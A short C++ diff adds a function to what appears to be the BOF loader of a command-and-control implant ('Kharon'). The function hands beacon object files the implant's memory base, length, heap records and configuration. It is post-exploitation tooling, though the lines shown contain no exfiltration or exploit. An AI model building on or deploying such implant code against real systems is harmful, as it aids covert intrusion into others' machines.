@@ -690,3 +690,19 @@ auto Coff::GetValue(
     
     return nullptr;
 }
+
+auto Coff::Information( BEACON_INFO* info ) -> BOOL {
+    G_KHARON
+
+    if ( ! info ) return FALSE;
+
+    info->BeaconPtr    = (PBYTE)Self->Session.Base.Start;
+    info->BeaconLength = Self->Session.Base.Length;
+
+    info->HeapRecords.EntryCount = Self->Hp->Count;
+    info->HeapRecords.NodeHead   = Self->Hp->Node;
+
+    info->Config = &Self->Config;
+
+    return TRUE;
+}
